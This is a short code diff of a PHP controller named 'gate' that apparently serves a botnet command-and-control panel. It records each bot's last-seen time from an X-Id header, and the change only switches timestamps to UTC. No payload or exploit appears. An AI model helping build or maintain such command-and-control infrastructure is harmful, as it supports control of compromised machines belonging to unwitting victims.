@@ -72,10 +72,9 @@ class gate extends Controller
 
                 //query database. get all running commands that the client hasn't done yet
                 //lets simulate the response
-                date_default_timezone_set('America/New_York');
                 $p = [];
                 $p[':botid'] = getallheaders()['X-Id']; //nothing else should be passed
-                $p[':ls'] = date('Y-m-d H:i:s');
+                $p[':ls'] = gmdate('Y-m-d H:i:s');
                 //update last seen
                 $statement = $pdo->prepare('UPDATE `bots` SET `lastseen` = :ls WHERE `id` = :botid');
                 $statement->execute($p);
